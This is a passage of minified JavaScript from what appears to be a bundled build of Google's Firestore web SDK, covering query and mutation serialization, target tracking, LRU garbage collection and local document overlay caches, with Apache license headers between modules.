this.ke.getRemoteKeysForTarget(e).size+t.addedDocuments.size-t.removedDocuments.size}Ne(e){this.He(e).Ne()}He(e){let t=this.qe.get(e);return t||(t=new KI,this.qe.set(e,t)),t}ct(e){let t=this.Ue.get(e);return t||(t=new yn($e),this.Ue=this.Ue.insert(e,t)),t}_t(e){let t=this.$e.get(e);return t||(t=new yn($e),this.$e=this.$e.insert(e,t)),t}Je(e){const t=this.Xe(e)!==null;return t||me("WatchChangeAggregator","Detected inactive target",e),t}Xe(e){const t=this.qe.get(e);return t&&t.De?null:this.ke.lt(e)}Ye(e){this.qe.set(e,new KI),this.ke.getRemoteKeysForTarget(e).forEach(t=>{this.ze(e,t,null)})}ut(e,t){return this.ke.getRemoteKeysForTarget(e).has(t)}}function uf(){return new Qt(Se.comparator)}function GI(){return new Qt(Se.comparator)}const nF=(()=>({asc:"ASCENDING",desc:"DESCENDING"}))(),rF=(()=>({"<":"LESS_THAN","<=":"LESS_THAN_OR_EQUAL",">":"GREATER_THAN",">=":"GREATER_THAN_OR_EQUAL","==":"EQUAL","!=":"NOT_EQUAL","array-contains":"ARRAY_CONTAINS",in:"IN","not-in":"NOT_IN","array-contains-any":"ARRAY_CONTAINS_ANY"}))(),iF=(()=>({and:"AND",or:"OR"}))();class sF{constructor(e,t){this.databaseId=e,this.useProto3Json=t}}function _y(n,e){return n.useProto3Json||zp(e)?e:{value:e}}function Fd(n,e){return n.useProto3Json?`${new Date(1e3*e.seconds).toISOString().replace(/\.\d*/,"").replace("Z","")}.${("000000000"+e.nanoseconds).slice(-9)}Z`:{seconds:""+e.seconds,nanos:e.nanoseconds}}function xk(n,e){return n.useProto3Json?e.toBase64():e.toUint8Array()}function oF(n,e){return Fd(n,e.toTimestamp())}function xi(n){return st(!!n),De.fromTimestamp(function(t){const r=co(t);return new mn(r.seconds,r.nanos)}(n))}function Mv(n,e){return Ey(n,e).canonicalString()}function Ey(n,e){const t=function(i){return new Mt(["projects",i.projectId,"databases",i.database])}(n).child("documents");return e===void 0?t:t.child(e)}function kk(n){const e=Mt.fromString(n);return st(Pk(e)),e}function Iy(n,e){return Mv(n.databaseId,e.path)}function bm(n,e){const t=kk(e);if(t.get(1)!==n.databaseId.projectId)throw new we(ie.INVALID_ARGUMENT,"Tried to deserialize key from different project: "+t.get(1)+" vs "+n.databaseId.projectId);if(t.get(3)!==n.databaseId.database)throw new we(ie.INVALID_ARGUMENT,"Tried to deserialize key from different database: "+t.get(3)+" vs "+n.databaseId.database);return new Se(Rk(t))}function Ck(n,e){return Mv(n.databaseId,e)}function aF(n){const e=kk(n);return e.length===4?Mt.emptyPath():Rk(e)}function Sy(n){return new Mt(["projects",n.databaseId.projectId,"databases",n.databaseId.database]).canonicalString()}function Rk(n){return st(n.length>4&&n.get(4)==="documents"),n.popFirst(5)}function QI(n,e,t){return{name:Iy(n,e),fields:t.value.mapValue.fields}}function lF(n,e){let t;if("targetChange"in e){e.targetChange;const r=function(u){return u==="NO_CHANGE"?0:u==="ADD"?1:u==="REMOVE"?2:u==="CURRENT"?3:u==="RESET"?4:Me()}(e.targetChange.targetChangeType||"NO_CHANGE"),i=e.targetChange.targetIds||[],s=function(u,h){return u.useProto3Json?(st(h===void 0||typeof h=="string"),Vn.fromBase64String(h||"")):(st(h===void 0||h instanceof Buffer||h instanceof Uint8Array),Vn.fromUint8Array(h||new Uint8Array))}(n,e.targetChange.resumeToken),o=e.targetChange.cause,a=o&&function(u){const h=u.code===void 0?ie.UNKNOWN:Tk(u.code);return new we(h,u.message||"")}(o);t=new bk(r,i,s,a||null)}else if("documentChange"in e){e.documentChange;const r=e.documentChange;r.document,r.document.name,r.document.updateTime;const i=bm(n,r.document.name),s=xi(r.document.updateTime),o=r.document.createTime?xi(r.document.createTime):De.min(),a=new gr({mapValue:{fields:r.document.fields}}),l=Xn.newFoundDocument(i,s,o,a),u=r.targetIds||[],h=r.removedTargetIds||[];t=new Uf(u,h,l.key,l)}else if("documentDelete"in e){e.documentDelete;const r=e.documentDelete;r.document;const i=bm(n,r.document),s=r.readTime?xi(r.readTime):De.min(),o=Xn.newNoDocument(i,s),a=r.removedTargetIds||[];t=new Uf([],a,o.key,o)}else if("documentRemove"in e){e.documentRemove;const r=e.documentRemove;r.document;const i=bm(n,r.document),s=r.removedTargetIds||[];t=new Uf([],s,i,null)}else{if(!("filter"in e))return Me();{e.filter;const r=e.filter;r.targetId;const{count:i=0,unchangedNames:s}=r,o=new JV(i,s),a=r.targetId;t=new Ak(a,o)}}return t}function cF(n,e){let t;if(e instanceof ph)t={update:QI(n,e.key,e.value)};else if(e instanceof Sk)t={delete:Iy(n,e.key)};else if(e instanceof Eo)t={update:QI(n,e.key,e.data),updateMask:wF(e.fieldMask)};else{if(!(e instanceof QV))return Me();t={verify:Iy(n,e.key)}}return e.fieldTransforms.length>0&&(t.updateTransforms=e.fieldTransforms.map(r=>function(s,o){const a=o.transform;if(a instanceof jd)return{fieldPath:o.field.canonicalString(),setToServerValue:"REQUEST_TIME"};if(a instanceof qu)return{fieldPath:o.field.canonicalString(),appendMissingElements:{values:a.elements}};if(a instanceof Ku)return{fieldPath:o.field.canonicalString(),removeAllFromArray:{values:a.elements}};if(a instanceof Vd)return{fieldPath:o.field.canonicalString(),increment:a.Ie};throw Me()}(0,r))),e.precondition.isNone||(t.currentDocument=function(i,s){return s.updateTime!==void 0?{updateTime:oF(i,s.updateTime)}:s.exists!==void 0?{exists:s.exists}:Me()}(n,e.precondition)),t}function uF(n,e){return n&&n.length>0?(st(e!==void 0),n.map(t=>function(i,s){let o=i.updateTime?xi(i.updateTime):xi(s);return o.isEqual(De.min())&&(o=xi(s)),new qV(o,i.transformResults||[])}(t,e))):[]}function hF(n,e){return{documents:[Ck(n,e.path)]}}function fF(n,e){const t={structuredQuery:{}},r=e.path;let i;e.collectionGroup!==null?(i=r,t.structuredQuery.from=[{collectionId:e.collectionGroup,allDescendants:!0}]):(i=r.popLast(),t.structuredQuery.from=[{collectionId:r.lastSegment()}]),t.parent=Ck(n,i);const s=function(u){if(u.length!==0)return Nk(gi.create(u,"and"))}(e.filters);s&&(t.structuredQuery.where=s);const o=function(u){if(u.length!==0)return u.map(h=>function(m){return{field:Fa(m.field),direction:gF(m.dir)}}(h))}(e.orderBy);o&&(t.structuredQuery.orderBy=o);const a=_y(n,e.limit);return a!==null&&(t.structuredQuery.limit=a),e.startAt&&(t.structuredQuery.startAt=function(u){return{before:u.inclusive,values:u.position}}(e.startAt)),e.endAt&&(t.structuredQuery.endAt=function(u){return{before:!u.inclusive,values:u.position}}(e.endAt)),{ht:t,parent:i}}function dF(n){let e=aF(n.parent);const t=n.structuredQuery,r=t.from?t.from.length:0;let i=null;if(r>0){st(r===1);const h=t.from[0];h.allDescendants?i=h.collectionId:e=e.child(h.collectionId)}let s=[];t.where&&(s=function(f){const m=Mk(f);return m instanceof gi&&ok(m)?m.getFilters():[m]}(t.where));let o=[];t.orderBy&&(o=function(f){return f.map(m=>function(x){return new Ud(za(x.field),function(I){switch(I){case"ASCENDING":return"asc";case"DESCENDING":return"desc";default:return}}(x.direction))}(m))}(t.orderBy));let a=null;t.limit&&(a=function(f){let m;return m=typeof f=="object"?f.value:f,zp(m)?null:m}(t.limit));let l=null;t.startAt&&(l=function(f){const m=!!f.before,v=f.values||[];return new Bd(v,m)}(t.startAt));let u=null;return t.endAt&&(u=function(f){const m=!f.before,v=f.values||[];return new Bd(v,m)}(t.endAt)),PV(e,i,o,s,a,"F",l,u)}function pF(n,e){const t=function(i){switch(i){case"TargetPurposeListen":return null;case"TargetPurposeExistenceFilterMismatch":return"existence-filter-mismatch";case"TargetPurposeExistenceFilterMismatchBloom":return"existence-filter-mismatch-bloom";case"TargetPurposeLimboResolution":return"limbo-document";default:return Me()}}(e.purpose);return t==null?null:{"goog-listen-tags":t}}function Mk(n){return n.unaryFilter!==void 0?function(t){switch(t.unaryFilter.op){case"IS_NAN":const r=za(t.unaryFilter.field);return fn.create(r,"==",{doubleValue:NaN});case"IS_NULL":const i=za(t.unaryFilter.field);return fn.create(i,"==",{nullValue:"NULL_VALUE"});case"IS_NOT_NAN":const s=za(t.unaryFilter.field);return fn.create(s,"!=",{doubleValue:NaN});case"IS_NOT_NULL":const o=za(t.unaryFilter.field);return fn.create(o,"!=",{nullValue:"NULL_VALUE"});default:return Me()}}(n):n.fieldFilter!==void 0?function(t){return fn.create(za(t.fieldFilter.field),function(i){switch(i){case"EQUAL":return"==";case"NOT_EQUAL":return"!=";case"GREATER_THAN":return">";case"GREATER_THAN_OR_EQUAL":return">=";case"LESS_THAN":return"<";case"LESS_THAN_OR_EQUAL":return"<=";case"ARRAY_CONTAINS":return"array-contains";case"IN":return"in";case"NOT_IN":return"not-in";case"ARRAY_CONTAINS_ANY":return"array-contains-any";default:return Me()}}(t.fieldFilter.op),t.fieldFilter.value)}(n):n.compositeFilter!==void 0?function(t){return gi.create(t.compositeFilter.filters.map(r=>Mk(r)),function(i){switch(i){case"AND":return"and";case"OR":return"or";default:return Me()}}(t.compositeFilter.op))}(n):Me()}function gF(n){return nF[n]}function mF(n){return rF[n]}function yF(n){return iF[n]}function Fa(n){return{fieldPath:n.canonicalString()}}function za(n){return Bn.fromServerFormat(n.fieldPath)}function Nk(n){return n instanceof fn?function(t){if(t.op==="=="){if(OI(t.value))return{unaryFilter:{field:Fa(t.field),op:"IS_NAN"}};if(DI(t.value))return{unaryFilter:{field:Fa(t.field),op:"IS_NULL"}}}else if(t.op==="!="){if(OI(t.value))return{unaryFilter:{field:Fa(t.field),op:"IS_NOT_NAN"}};if(DI(t.value))return{unaryFilter:{field:Fa(t.field),op:"IS_NOT_NULL"}}}return{fieldFilter:{field:Fa(t.field),op:mF(t.op),value:t.value}}}(n):n instanceof gi?function(t){const r=t.getFilters().map(i=>Nk(i));return r.length===1?r[0]:{compositeFilter:{op:yF(t.op),filters:r}}}(n):Me()}function wF(n){const e=[];return n.fields.forEach(t=>e.push(t.canonicalString())),{fieldPaths:e}}function Pk(n){return n.length>=4&&n.get(0)==="projects"&&n.get(2)==="databases"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class zs{constructor(e,t,r,i,s=De.min(),o=De.min(),a=Vn.EMPTY_BYTE_STRING,l=null){this.target=e,this.targetId=t,this.purpose=r,this.sequenceNumber=i,this.snapshotVersion=s,this.lastLimboFreeSnapshotVersion=o,this.resumeToken=a,this.expectedCount=l}withSequenceNumber(e){return new zs(this.target,this.targetId,this.purpose,e,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,this.expectedCount)}withResumeToken(e,t){return new zs(this.target,this.targetId,this.purpose,this.sequenceNumber,t,this.lastLimboFreeSnapshotVersion,e,null)}withExpectedCount(e){return new zs(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,e)}withLastLimboFreeSnapshotVersion(e){return new zs(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,e,this.resumeToken,this.expectedCount)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vF{constructor(e){this.Tt=e}}function _F(n){const e=dF({parent:n.parent,structuredQuery:n.structuredQuery});return n.limitType==="LAST"?vy(e,e.limit,"L"):e}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class EF{constructor(){this.Tn=new IF}addToCollectionParentIndex(e,t){return this.Tn.add(t),re.resolve()}getCollectionParents(e,t){return re.resolve(this.Tn.getEntries(t))}addFieldIndex(e,t){return re.resolve()}deleteFieldIndex(e,t){return re.resolve()}deleteAllFieldIndexes(e){return re.resolve()}createTargetIndexes(e,t){return re.resolve()}getDocumentsMatchingTarget(e,t){return re.resolve(null)}getIndexType(e,t){return re.resolve(0)}getFieldIndexes(e,t){return re.resolve([])}getNextCollectionGroupToUpdate(e){return re.resolve(null)}getMinOffset(e,t){return re.resolve(lo.min())}getMinOffsetFromCollectionGroup(e,t){return re.resolve(lo.min())}updateCollectionGroup(e,t,r){return re.resolve()}updateIndexEntries(e,t){return re.resolve()}}class IF{constructor(){this.index={}}add(e){const t=e.lastSegment(),r=e.popLast(),i=this.index[t]||new yn(Mt.comparator),s=!i.has(r);return this.index[t]=i.add(r),s}has(e){const t=e.lastSegment(),r=e.popLast(),i=this.index[t];return i&&i.has(r)}getEntries(e){return(this.index[e]||new yn(Mt.comparator)).toArray()}}/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const YI={didRun:!1,sequenceNumbersCollected:0,targetsRemoved:0,documentsRemoved:0},Lk=41943040;class fr{static withCacheSize(e){return new fr(e,fr.DEFAULT_COLLECTION_PERCENTILE,fr.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT)}constructor(e,t,r){this.cacheSizeCollectionThreshold=e,this.percentileToCollect=t,this.maximumSequenceNumbersToCollect=r}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */fr.DEFAULT_COLLECTION_PERCENTILE=10,fr.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT=1e3,fr.DEFAULT=new fr(Lk,fr.DEFAULT_COLLECTION_PERCENTILE,fr.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT),fr.DISABLED=new fr(-1,0,0);/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fl{constructor(e){this.$n=e}next(){return this.$n+=2,this.$n}static Un(){return new Fl(0)}static Kn(){return new Fl(-1)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ZI="LruGarbageCollector",SF=1048576;function JI([n,e],[t,r]){const i=$e(n,t);return i===0?$e(e,r):i}class TF{constructor(e){this.Hn=e,this.buffer=new yn(JI),this.Jn=0}Yn(){return++this.Jn}Zn(e){const t=[e,this.Yn()];if(this.buffer.size<this.Hn)this.buffer=this.buffer.add(t);else{const r=this.buffer.last();JI(t,r)<0&&(this.buffer=this.buffer.delete(r).add(t))}}get maxValue(){return this.buffer.last()[0]}}class AF{constructor(e,t,r){this.garbageCollector=e,this.asyncQueue=t,this.localStore=r,this.Xn=null}start(){this.garbageCollector.params.cacheSizeCollectionThreshold!==-1&&this.er(6e4)}stop(){this.Xn&&(this.Xn.cancel(),this.Xn=null)}get started(){return this.Xn!==null}er(e){me(ZI,`Garbage collection scheduled in ${e}ms`),this.Xn=this.asyncQueue.enqueueAfterDelay("lru_garbage_collection",e,async()=>{this.Xn=null;try{await this.localStore.collectGarbage(this.garbageCollector)}catch(t){sc(t)?me(ZI,"Ignoring IndexedDB error during garbage collection: ",t):await ic(t)}await this.er(3e5)})}}class bF{constructor(e,t){this.tr=e,this.params=t}calculateTargetCount(e,t){return this.tr.nr(e).next(r=>Math.floor(t/100*r))}nthSequenceNumber(e,t){if(t===0)return re.resolve(Fp.ae);const r=new TF(t);return this.tr.forEachTarget(e,i=>r.Zn(i.sequenceNumber)).next(()=>this.tr.rr(e,i=>r.Zn(i))).next(()=>r.maxValue)}removeTargets(e,t,r){return this.tr.removeTargets(e,t,r)}removeOrphanedDocuments(e,t){return this.tr.removeOrphanedDocuments(e,t)}collect(e,t){return this.params.cacheSizeCollectionThreshold===-1?(me("LruGarbageCollector","Garbage collection skipped; disabled"),re.resolve(YI)):this.getCacheSize(e).next(r=>r<this.params.cacheSizeCollectionThreshold?(me("LruGarbageCollector",`Garbage collection skipped; Cache size ${r} is lower than threshold ${this.params.cacheSizeCollectionThreshold}`),YI):this.ir(e,t))}getCacheSize(e){return this.tr.getCacheSize(e)}ir(e,t){let r,i,s,o,a,l,u;const h=Date.now();return this.calculateTargetCount(e,this.params.percentileToCollect).next(f=>(f>this.params.maximumSequenceNumbersToCollect?(me("LruGarbageCollector",`Capping sequence numbers to collect down to the maximum of ${this.params.maximumSequenceNumbersToCollect} from ${f}`),i=this.params.maximumSequenceNumbersToCollect):i=f,o=Date.now(),this.nthSequenceNumber(e,i))).next(f=>(r=f,a=Date.now(),this.removeTargets(e,r,t))).next(f=>(s=f,l=Date.now(),this.removeOrphanedDocuments(e,r))).next(f=>(u=Date.now(),ja()<=Qe.DEBUG&&me("LruGarbageCollector",`LRU Garbage Collection
	Counted targets in ${o-h}ms
	Determined least recently used ${i} in `+(a-o)+`ms
	Removed ${s} targets in `+(l-a)+`ms
	Removed ${f} documents in `+(u-l)+`ms
Total Duration: ${u-h}ms`),re.resolve({didRun:!0,sequenceNumbersCollected:i,targetsRemoved:s,documentsRemoved:f})))}}function xF(n,e){return new bF(n,e)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class kF{constructor(){this.changes=new va(e=>e.toString(),(e,t)=>e.isEqual(t)),this.changesApplied=!1}addEntry(e){this.assertNotApplied(),this.changes.set(e.key,e)}removeEntry(e,t){this.assertNotApplied(),this.changes.set(e,Xn.newInvalidDocument(e).setReadTime(t))}getEntry(e,t){this.assertNotApplied();const r=this.changes.get(t);return r!==void 0?re.resolve(r):this.getFromCache(e,t)}getEntries(e,t){return this.getAllFromCache(e,t)}apply(e){return this.assertNotApplied(),this.changesApplied=!0,this.applyChanges(e)}assertNotApplied(){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *//**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class CF{constructor(e,t){this.overlayedDocument=e,this.mutatedFields=t}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class RF{constructor(e,t,r,i){this.remoteDocumentCache=e,this.mutationQueue=t,this.documentOverlayCache=r,this.indexManager=i}getDocument(e,t){let r=null;return this.documentOverlayCache.getOverlay(e,t).next(i=>(r=i,this.remoteDocumentCache.getEntry(e,t))).next(i=>(r!==null&&cu(r.mutation,i,Cr.empty(),mn.now()),i))}getDocuments(e,t){return this.remoteDocumentCache.getEntries(e,t).next(r=>this.getLocalViewOfDocuments(e,r,Ye()).next(()=>r))}getLocalViewOfDocuments(e,t,r=Ye()){const i=Ho();return this.populateOverlays(e,i,t).next(()=>this.computeViews(e,t,i,r).next(s=>{let o=Wc();return s.forEach((a,l)=>{o=o.insert(a,l.overlayedDocument)}),o}))}getOverlayedDocuments(e,t){const r=Ho();return this.populateOverlays(e,r,t).next(()=>this.computeViews(e,t,r,Ye()))}populateOverlays(e,t,r){const i=[];return r.forEach(s=>{t.has(s)||i.push(s)}),this.documentOverlayCache.getOverlays(e,i).next(s=>{s.forEach((o,a)=>{t.set(o,a)})})}computeViews(e,t,r,i){let s=ds();const o=lu(),a=function(){return lu()}();return t.forEach((l,u)=>{const h=r.get(u.key);i.has(u.key)&&(h===void 0||h.mutation instanceof Eo)?s=s.insert(u.key,u):h!==void 0?(o.set(u.key,h.mutation.getFieldMask()),cu(h.mutation,u,h.mutation.getFieldMask(),mn.now())):o.set(u.key,Cr.empty())}),this.recalculateAndSaveOverlays(e,s).next(l=>(l.forEach((u,h)=>o.set(u,h)),t.forEach((u,h)=>{var f;return a.set(u,new CF(h,(f=o.get(u))!==null&&f!==void 0?f:null))}),a))}recalculateAndSaveOverlays(e,t){const r=lu();let i=new Qt((o,a)=>o-a),s=Ye();return this.mutationQueue.getAllMutationBatchesAffectingDocumentKeys(e,t).next(o=>{for(const a of o)a.keys().forEach(l=>{const u=t.get(l);if(u===null)return;let h=r.get(l)||Cr.empty();h=a.applyToLocalView(u,h),r.set(l,h);const f=(i.get(a.batchId)||Ye()).add(l);i=i.insert(a.batchId,f)})}).next(()=>{const o=[],a=i.getReverseIterator();for(;a.hasNext();){const l=a.getNext(),u=l.key,h=l.value,f=gk();h.forEach(m=>{if(!s.has(m)){const v=Ek(t.get(m),r.get(m));v!==null&&f.set(m,v),s=s.add(m)}}),o.push(this.documentOverlayCache.saveOverlays(e,u,f))}return re.waitFor(o)}).next(()=>r)}recalculateAndSaveOverlaysForDocumentKeys(e,t){return this.remoteDocumentCache.getEntries(e,t).next(r=>this.recalculateAndSaveOverlays(e,r))}getDocumentsMatchingQuery(e,t,r,i){return function(o){return Se.isDocumentKey(o.path)&&o.collectionGroup===null&&o.filters.length===0}(t)?this.getDocumentsMatchingDocumentQuery(e,t.path):uk(t)?this.getDocumentsMatchingCollectionGroupQuery(e,t,r,i):this.getDocumentsMatchingCollectionQuery(e,t,r,i)}getNextDocuments(e,t,r,i){return this.remoteDocumentCache.getAllFromCollectionGroup(e,t,r,i).next(s=>{const o=i-s.size>0?this.documentOverlayCache.getOverlaysForCollectionGroup(e,t,r.largestBatchId,i-s.size):re.resolve(Ho());let a=zu,l=s;return o.next(u=>re.forEach(u,(h,f)=>(a<f.largestBatchId&&(a=f.largestBatchId),s.get(h)?re.resolve():this.remoteDocumentCache.getEntry(e,h).next(m=>{l=l.insert(h,m)}))).next(()=>this.populateOverlays(e,u,s)).next(()=>this.computeViews(e,l,u,Ye())).next(h=>({batchId:a,changes:pk(h)})))})}getDocumentsMatchingDocumentQuery(e,t){return this.getDocument(e,new Se(t)).next(r=>{let i=Wc();return r.isFoundDocument()&&(i=i.insert(r.key,r)),i})}getDocumentsMatchingCollectionGroupQuery(e,t,r,i){const s=t.collectionGroup;let o=Wc();return this.indexManager.getCollectionParents(e,s).next(a=>re.forEach(a,l=>{const u=function(f,m){return new dh(m,null,f.explicitOrderBy.slice(),f.filters.slice(),f.limit,f.limitType,f.startAt,f.endAt)}(t,l.child(s));return this.getDocumentsMatchingCollectionQuery(e,u,r,i).next(h=>{h.forEach((f,m)=>{o=o.insert(f,m)})})}).next(()=>o))}getDocumentsMatchingCollectionQuery(e,t,r,i){let s;return this.documentOverlayCache.getOverlaysForCollection(e,t.path,r.largestBatchId).next(o=>(s=o,this.remoteDocumentCache.getDocumentsMatchingQuery(e,t,r,s,i))).next(o=>{s.forEach((l,u)=>{const h=u.getKey();o.get(h)===null&&(o=o.insert(h,Xn.newInvalidDocument(h)))});let a=Wc();return o.forEach((l,u)=>{const h=s.get(l);h!==void 0&&cu(h.mutation,u,Cr.empty(),mn.now()),Hp(t,u)&&(a=a.insert(l,u))}),a})}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class MF{constructor(e){this.serializer=e,this.dr=new Map,this.Ar=new Map}getBundleMetadata(e,t){return re.resolve(this.dr.get(t))}saveBundleMetadata(e,t){return this.dr.set(t.id,function(i){return{id:i.id,version:i.version,createTime:xi(i.createTime)}}(t)),re.resolve()}getNamedQuery(e,t){return re.resolve(this.Ar.get(t))}saveNamedQuery(e,t){return this.Ar.set(t.name,function(i){return{name:i.name,query:_F(i.bundledQuery),readTime:xi(i.readTime)}}(t)),re.resolve()}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class NF{constructor(){this.overlays=new Qt(Se.comparator),this.Rr=new Map}getOverlay(e,t){return re.resolve(this.overlays.get(t))}getOverlays(e,t){const r=Ho();return re.forEach(t,i=>this.getOverlay(e,i).next(s=>{s!==null&&r.set(i,s)})).next(()=>r)}saveOverlays(e,t,r){return r.forEach((i,s)=>{this.Et(e,t,s)}),re.resolve()}removeOverlaysForBatchId(e,t,r){const i=this.Rr.get(r);return i!==void 0&&(i.forEach(s=>this.overlays=this.overlays.remove(s)),this.Rr.delete(r)),re.resolve()}getOverlaysForCollection(e,t,r){const i=Ho(),s=t.length+1,o=new Se(t.child("")),a=this.overlays.getIteratorFrom(o);for(;a.hasNext();){const l=a.getNext().value,u=l.getKey();if(!t.isPrefixOf(u.path))break;u.path.length===s&&l.largestBatchId>r&&i.set(l.getKey(),l)}return re.resolve(i)}getOverlaysForCollectionGroup(e,t,r,i){let s=new Qt((u,h)=>u-h);const o=this.overlays.getIterator();for(;o.hasNext();){const u=o.getNext().value;if(u.getKey().getCollectionGroup()===t&&u.largestBatchId>r){let h=s.get(u.largestBatchId);h===null&&(h=Ho(),s=s.insert(u.largestBatchId,h)),h.set(u.getKey(),u)}}const a=Ho(),l=s.getIterator();for(;l.hasNext()&&(l.getNext().value.forEach((u,h)=>a.set(u,h)),!(a.size()>=i)););return re.resolve(a)}Et(e,t,r){const i=this.overlays.get(r.key);if(i!==null){const o=this.Rr.get(i.largestBatchId).delete(r.key);this.Rr.set(i.largestBatchId,o)}this.overlays=this.overlays.insert(r.key,new ZV(t,r));let s=this.Rr.get(t);s===void 0&&(s=Ye(),this.Rr.set(t,s)),this.Rr.set(t,s.add(r.key))}}/**
 * @license
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
